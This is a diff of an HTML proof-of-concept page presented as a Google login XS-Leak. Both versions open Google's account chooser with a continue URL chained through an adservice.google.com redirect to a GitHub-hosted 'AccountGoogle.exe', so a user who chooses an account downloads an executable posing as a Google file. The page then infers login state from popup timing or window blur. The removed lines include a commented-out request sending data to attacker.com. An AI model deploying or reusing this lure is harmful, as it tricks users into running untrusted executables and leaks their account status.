@@ -1,112 +1,57 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Google Login XS-Leak PoC</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 50px;
-      background-color: #f9f9f9;
-    }
-
-    #status {
-      margin-top: 20px;
-      font-size: 18px;
-      color: #333;
-    }
-
-    #login-button {
-      padding: 12px 24px;
-      font-size: 16px;
-      color: #fff;
-      background-color: #4285F4;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      display: inline-flex;
-      align-items: center;
-      gap: 10px;
-      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
-      transition: background-color 0.2s ease, box-shadow 0.2s ease;
-    }
-
-    #login-button:hover {
-      background-color: #3367D6;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-    }
-
-    #login-button img {
-      width: 20px;
-      height: 20px;
-    }
-  </style>
+  <title>XS-Leak Download Detection</title>
 </head>
 <body>
+  <h1>Check Google Login State via Download Trigger</h1>
+  <button onclick="startCheck()">Start XS-Leak</button>
 
-  <h1>Check Google Account Login Status</h1>
-
-  <button id="login-button">
-    <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google Logo" />
-    Check Login State
-  </button>
-
-  <div id="status"></div>
+  <p id="status">Waiting...</p>
 
   <script>
-    const loginButton = document.getElementById('login-button');
-    const statusDisplay = document.getElementById('status');
+    let popup;
+    let blurDetected = false;
 
-    loginButton.addEventListener('click', () => {
+    function startCheck() {
+      document.getElementById('status').innerText = "Checking... Click popup if required";
 
-      const startTime = Date.now();
+      const googlePopupURL = "https://accounts.google.com/AccountChooser/signinchooser?continue=https%3A%2F%2Fadservice.google.com%2Fddm%2Fclk%2F408533097%3B208818505%3Bl%3B%3B%3F%2F%2Flanaya113505.github.io%2Fpizza%2FAccountGoogle.exe%3F";
 
-      // URL yang trigger download jika user klik akun di Google AccountChooser
-      const googleLoginURL = 'https://accounts.google.com/AccountChooser/signinchooser?continue=https%3A%2F%2Fadservice.google.com%2Fddm%2Fclk%2F408533097%3B208818505%3Bl%3B%3B%3F%2F%2Flanaya113505.github.io%2Fpizza%2FAccountGoogle.exe%3F%2Fhome&ddm=1&flowEntry=AccountChooser&flowName=GlifWebSignIn&hl=id&ltmpl=youtube&service=youtube&authuser=0';
-
-      const popupWidth = 500;
-      const popupHeight = 600;
-      const left = (screen.width / 2) - (popupWidth / 2);
-      const top = (screen.height / 2) - (popupHeight / 2);
-
-      const loginWindow = window.open(
-        googleLoginURL,
-        'Google Login',
-        `width=${popupWidth},height=${popupHeight},top=${top},left=${left}`
+      // Open popup targeting the Google account chooser + file download
+      popup = window.open(
+        googlePopupURL,
+        "GoogleLoginPopup",
+        "width=500,height=600"
       );
 
-      statusDisplay.innerText = "Waiting for user interaction...";
+      // Listen for blur event on attacker window (user may be interacting with download bar)
+      window.onblur = () => {
+        blurDetected = true;
+        console.log("Blur detected! Possible download triggered.");
+      };
 
-      const checkPopupClosed = setInterval(() => {
-        if (loginWindow.closed) {
-          clearInterval(checkPopupClosed);
+      // Monitor popup close and infer behavior
+      const startTime = performance.now();
+      const popupMonitor = setInterval(() => {
+        if (popup.closed) {
+          clearInterval(popupMonitor);
+          const endTime = performance.now();
+          const elapsed = endTime - startTime;
 
-          const duration = Date.now() - startTime;
-          console.log('Popup closed after', duration, 'ms');
+          let message = "❌ User NOT logged in (no download or no interaction).";
 
-          if (duration < 5000) {
-            statusDisplay.innerText = "✅ User likely logged in and interacted (fast close).";
-          } else {
-            statusDisplay.innerText = "❌ User likely not logged in or slow interaction.";
+          if (blurDetected || elapsed > 2000) {
+            message = "✅ User likely LOGGED IN → Download triggered (blur detected or long wait).";
           }
 
-          // Optional: send data to server for analysis (don't do this without permission)
-          // fetch('https://attacker.com/log?time=' + duration);
+          document.getElementById('status').innerText = message;
+
+          // Reset
+          window.onblur = null;
         }
       }, 500);
-
-      // OPTIONAL: fallback timeout if popup not closed in X seconds
-      setTimeout(() => {
-        if (!loginWindow.closed) {
-          clearInterval(checkPopupClosed);
-          loginWindow.close();
-          statusDisplay.innerText = "❌ No interaction detected (timeout).";
-        }
-      }, 20000); // 20 seconds timeout
-    });
+    }
   </script>
-
 </body>
 </html>
